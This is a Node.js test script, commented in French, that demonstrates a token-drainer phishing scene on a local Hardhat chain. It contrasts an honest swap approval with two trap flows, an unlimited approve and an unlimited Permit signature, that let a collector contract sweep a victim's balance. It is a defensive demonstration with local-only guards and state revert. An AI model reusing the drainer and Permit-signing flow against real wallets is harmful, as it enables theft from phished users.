// Preuve, sans navigateur, de la scene d'echange. Envoie sur la chaine locale les MEMES
// demandes que la page (site_echange/app.js) et verifie l'etat par lecture de la chaine.
//
//   node preuve.mjs            (verifie honnete + piege approve + piege permit)
//
// Securite : ne parle qu'a 127.0.0.1 (garde assertSafeRpc de ../../chain/lib.mjs, via makeContext).
// Comptes de test : des portefeuilles ALEATOIRES crees a l'execution, finances en gaz par le noeud
// local (hardhat_setBalance). Aucune cle n'est stockee dans le depot. Toute la scene est jouee entre
// evm_snapshot et evm_revert : l'etat de la chaine (repetition live) est restaure a la fin.
import { pathToFileURL } from "node:url";
import path from "node:path";
import { fileURLToPath } from "node:url";

const here = path.dirname(fileURLToPath(import.meta.url));
const lib = await import(pathToFileURL(path.join(here, "..", "..", "chain", "lib.mjs")).href);
const { ethers, ERC20_ABI, makeContext, setLocalBalance } = lib;

const MAX_UINT256 = (1n << 256n) - 1n;
const AMOUNT = 50n * 10n ** 6n; // 50 DUSDC (6 decimales)
const START = 100n * 10n ** 6n; // solde de depart de chaque compte de test
const DEADLINE = 4102444800n; // 1er janvier 2100

const ROUTER_ABI = ["function swapUSDCforWAVAX(uint256 amountIn,uint256 minAmountOut) returns (uint256)"];
const DRAINER_ABI = [
  "function collector() view returns (address)",
  "function sweepERC20(address token,address victim)",
  "function drainWithPermit(address token,address victim,uint256 amount,uint256 deadline,uint8 v,bytes32 r,bytes32 s)",
];

const f6 = (v) => ethers.formatUnits(v, 6);
const f18 = (v) => ethers.formatUnits(v, 18);
let failures = 0;
function check(label, cond, detail) {
  console.log((cond ? "  PASS " : "  FAIL ") + label + (detail ? " -> " + detail : ""));
  if (!cond) failures++;
}

async function newUser(ctx) {
  const w = ethers.Wallet.createRandom().connect(ctx.provider);
  await setLocalBalance(ctx.provider, w.address, 10n); // gaz uniquement
  const usdc = new ethers.Contract(ctx.addresses.usdc, ERC20_ABI, w);
  await (await usdc.mint(w.address, START)).wait(); // mint libre de DemoUSDC
  return w;
}

async function main() {
  const ctx = await makeContext("local");
  const { provider, addresses } = ctx;
  const usdc = new ethers.Contract(addresses.usdc, ERC20_ABI, provider);
  const wavax = new ethers.Contract(addresses.wavax, ERC20_ABI, provider);
  const drainer = new ethers.Contract(addresses.drainer, DRAINER_ABI, provider);

  console.log("Chaine : chainId " + addresses.chainId + " via " + addresses.rpcUrl);
  console.log("Routeur " + addresses.router + " / contrat de collecte " + addresses.drainer);

  const snapshot = await provider.send("evm_snapshot", []);
  console.log("evm_snapshot = " + snapshot + "\n");

  try {
    // ---------- MODE HONNETE : approve 50 au routeur, puis echange ----------
    console.log("MODE honnete (approve 50 DUSDC au routeur, puis swap)");
    {
      const u = await newUser(ctx);
      const uUsdc = usdc.connect(u);
      const before = await usdc.balanceOf(u.address);
      await (await uUsdc.approve(addresses.router, AMOUNT)).wait();
      const allowance = await usdc.allowance(u.address, addresses.router);
      check("autorisation au routeur = 50 DUSDC", allowance === AMOUNT, f6(allowance) + " DUSDC");

      const router = new ethers.Contract(addresses.router, ROUTER_ABI, u);
      await (await router.swapUSDCforWAVAX(AMOUNT, 0n)).wait();
      const after = await usdc.balanceOf(u.address);
      const gotWavax = await wavax.balanceOf(u.address);
      check("solde DUSDC en baisse de 50", before - after === AMOUNT, f6(before) + " -> " + f6(after));
      check("AVAX (WAVAX) recu en contrepartie", gotWavax > 0n, f18(gotWavax) + " WAVAX");
    }

    // ---------- MODE PIEGE (approve illimite vers le contrat de collecte) ----------
    console.log("\nMODE piege (approve illimite vers un contrat qui n'est pas le routeur)");
    {
      const u = await newUser(ctx);
      const before = await usdc.balanceOf(u.address);
      await (await usdc.connect(u).approve(addresses.drainer, MAX_UINT256)).wait();
      const allowance = await usdc.allowance(u.address, addresses.drainer);
      check("autorisation ILLIMITEE au contrat de collecte", allowance === MAX_UINT256, "2^256-1");
      check("la cible n'est pas le routeur", addresses.drainer.toLowerCase() !== addresses.router.toLowerCase(), addresses.drainer);

      // Le contrat de collecte peut alors vider le solde (ce que la page honnete ne permet jamais).
      const collectorSigner = await provider.getSigner(addresses.collector);
      const collectorBefore = await usdc.balanceOf(addresses.collector);
      await (await drainer.connect(collectorSigner).sweepERC20(addresses.usdc, u.address)).wait();
      const after = await usdc.balanceOf(u.address);
      const collectorAfter = await usdc.balanceOf(addresses.collector);
      check("solde de la victime vide", after === 0n, f6(before) + " -> " + f6(after));
      check("le contrat de collecte a tout recupere", collectorAfter - collectorBefore === before, "+" + f6(collectorAfter - collectorBefore) + " DUSDC");
    }

    // ---------- MODE PIEGE via=permit (signature Permit illimitee) ----------
    console.log("\nMODE piege&via=permit (signature Permit illimitee vers le meme contrat)");
    {
      const u = await newUser(ctx);
      const before = await usdc.balanceOf(u.address);
      const nonce = await usdc.nonces(u.address);
      const domain = { name: "Demo USDC", version: "1", chainId: Number(addresses.chainId), verifyingContract: addresses.usdc };
      const types = { Permit: [
        { name: "owner", type: "address" }, { name: "spender", type: "address" },
        { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" },
      ] };
      const value = { owner: u.address, spender: addresses.drainer, value: MAX_UINT256, nonce, deadline: DEADLINE };
      const sig = ethers.Signature.from(await u.signTypedData(domain, types, value));
      check("signature Permit vers le contrat de collecte", true, "spender = " + addresses.drainer);

      const collectorSigner = await provider.getSigner(addresses.collector);
      const collectorBefore = await usdc.balanceOf(addresses.collector);
      await (await drainer.connect(collectorSigner).drainWithPermit(addresses.usdc, u.address, MAX_UINT256, DEADLINE, sig.v, sig.r, sig.s)).wait();
      const after = await usdc.balanceOf(u.address);
      const collectorAfter = await usdc.balanceOf(addresses.collector);
      check("solde de la victime vide via permit", after === 0n, f6(before) + " -> " + f6(after));
      check("le contrat de collecte a tout recupere", collectorAfter - collectorBefore === before, "+" + f6(collectorAfter - collectorBefore) + " DUSDC");
    }
  } finally {
    const reverted = await provider.send("evm_revert", [snapshot]);
    console.log("\nevm_revert = " + reverted + " (etat de la chaine restaure)");
  }

  console.log(failures === 0 ? "\nTOUT VERT" : "\n" + failures + " verification(s) en echec");
  process.exit(failures === 0 ? 0 : 1);
}

main().catch((e) => { console.error("Erreur:", e.message || e); process.exit(1); });
